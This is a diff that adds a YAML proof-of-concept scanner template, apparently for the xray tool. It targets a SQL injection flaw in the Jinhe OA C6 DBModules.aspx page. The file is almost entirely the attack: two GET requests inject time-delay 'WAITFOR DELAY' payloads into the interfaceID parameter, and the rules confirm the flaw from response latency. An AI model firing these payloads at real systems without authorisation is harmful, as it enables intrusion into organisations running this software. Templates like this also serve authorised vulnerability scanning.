@@ -1,0 +1,25 @@
+name: poc-yaml-jinheOA-C6-DBModules.aspx-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:8'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486835&idx=1&sn=7d72c88aa52322bd09ab08c058513509&chksm=c267b840f51031568c3494cca4a9f84a8c2c61ae25f26786e5bc61f060c45cd6b7cc69f419c5&token=522460222&lang=zh_CN#rd
